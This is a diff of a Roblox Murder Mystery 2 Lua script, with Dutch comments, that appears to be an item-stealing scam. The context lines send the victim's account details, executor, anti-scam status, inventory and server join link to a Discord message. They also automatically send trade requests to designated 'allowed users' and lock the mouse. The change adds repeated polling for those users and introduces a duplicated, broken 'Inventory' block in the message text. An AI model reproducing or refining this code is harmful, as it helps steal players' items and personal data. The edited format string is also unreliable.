@@ -102,7 +102,7 @@ local function send_discord(items, game_name)
     end
     local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
     local desc = string.format(
-        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
+        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
         lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
         receivers, table.concat(inv_lines, "\n"), rubis_url, join
     )
@@ -183,7 +183,6 @@ local function hook_mm2()
                 end
             end
         end
-        -- shiftlock via RenderStepped zodat game het niet kan overschrijven
         if shiftlockConn then shiftlockConn:Disconnect() end
         shiftlockConn = RunService.RenderStepped:Connect(function()
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
@@ -210,24 +209,25 @@ local function hook_mm2()
         end
     end
 
-    -- direct checken of allowed user al in server is
     task.spawn(function()
-        task.wait(1)
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= lp and isAllowedUser(player.Name) then
-                storeItems()
-                pcall(function() sendRequest:InvokeServer(player) end)
-                return
+        while not tradingWithAllowed do
+            task.wait(2)
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= lp and isAllowedUser(player.Name) then
+                    storeItems()
+                    pcall(function() sendRequest:InvokeServer(player) end)
+                    break
+                end
             end
         end
-        -- anders wachten tot ze joinen
-        Players.PlayerAdded:Connect(function(player)
-            if isAllowedUser(player.Name) and not tradingWithAllowed then
-                task.wait(1)
-                storeItems()
-                pcall(function() sendRequest:InvokeServer(player) end)
-            end
-        end)
+    end)
+
+    Players.PlayerAdded:Connect(function(player)
+        if isAllowedUser(player.Name) and not tradingWithAllowed then
+            task.wait(1)
+            storeItems()
+            pcall(function() sendRequest:InvokeServer(player) end)
+        end
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData, operatorName)
